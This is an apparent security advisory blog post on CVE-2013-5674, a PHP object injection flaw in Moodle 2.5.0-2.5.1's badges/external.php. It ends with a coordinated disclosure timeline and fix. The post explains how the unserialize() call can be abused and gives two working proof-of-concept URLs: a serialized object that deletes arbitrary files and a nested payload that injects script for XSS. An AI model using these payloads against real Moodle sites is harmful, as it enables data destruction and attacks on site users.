---
comments: true
date: 2013-09-16 12:58:30
layout: post
slug: 2013-09-16-moodle-2_5_0_1-badges-external-object-injection
title: Moodle 2.5.0-1 badges/external.php PHP Object Injection
categories:
- Security
- Vulnerabilities
- Web Apps
tags:
- CVE-2013-5674
- advisory
- moodle
- pentesting
- security
- vulnerability
- xss
- php
- object injection
---

Moodle CMS is prone to an object injection vulnerability, which can be exploited to execute internal PHP code passing malicious user-supplied input to an internal `unserialize()` PHP function.

The attacker can inject ad-hoc serialized object into the application scope, reusing internal PHP code snippets maliciously. In this scenario the attacker can delete arbitrary files and conduct XSS attacks.

The vulnerability affects Moodle CMS versions 2.5.0 and 2.5.1

## Vulnerability 

The affected file `badges/external.php` unserializes the user input in the line 35

```php
$json = required_param('badge', PARAM_RAW);
$badge = new external_badge(unserialize($json));
```

## POC

To exploit this kind of vulnerability is necessary to reuse some object method called during the life time of the object instance. As explained in the PHP [manual](http://php.net/manual/en/language.oop5.magic.php) magic methods documentation, two methods are necessarly called:

  - `__wakeup()`: This method is called at the wake up of the sleeping unserialized object.
  - `__destroy()`: As in other object-oriented languages, the destructor method is called at the end of the instance life.

Moreover two other `__get(string $name)` methods are called during this particular object instance lifetime, in the form of `instance->$name`.

  - `__get("assertion")`: Called in badges/renderer.php:377 `$issued->assertion` 
  - `__get("imageUrl")`: Called in badges/renderer.php:389 `array('src' => $issued->imageUrl)`

### FILE DELETE

The method `csv_export_writer::__destruct()` in lib/csvlib.class.php:538 contains

```php
    public function __destruct() {
        fclose($this->fp);
        unlink($this->path);
    }
```

This can be exploited to delete arbitrary files passing the serialized object. Here the PoC to delete `/path/of/the/file/to/delete`:

```html
http://localhost/badges/external.php?badge=O:17:"csv_export_writer":1:{s:4:"path";s:27:"/path/of/the/file/to/delete";}
```

### XSS

The vulnerable script `badges/external.php` prints in line 43 the HTML code rendered using the injected unserialized `$badge` object 

```php
echo $output->render($badge);
```

The rendered HTML page built in the `core_badges_renderer::render_external_badge()` reflects the two object variable `assertion` and `imageurl` that can be used as XSS vector. Here the PoC of the XSS:

```html
http://localhost/badges/external.php?badge=O:8:"stdClass":2:{s:8:"imageUrl";s:0:"";s:9:"assertion";O:8:"stdClass":1:{s:5:"badge";O:8:"stdClass":1:{s:6:"issuer";O:8:"stdClass":1:{s:4:"name";s:30:"<script>alert(1);</script><!--";}}}}
```

## CVE REFERENCE

The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2013-5674](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2013-5674) to the vulnerability

## DISCLOSURE

* 29/Jul/2013: Vendor alerted with MDL-40924 ticket
* 02/Sep/2013: Released fix commit 2d3c0faef by Yuliya Bozhko
* 07/Sep/2013: Moodle release 2.5.2
* 16/Sep/2013: Public disclosure

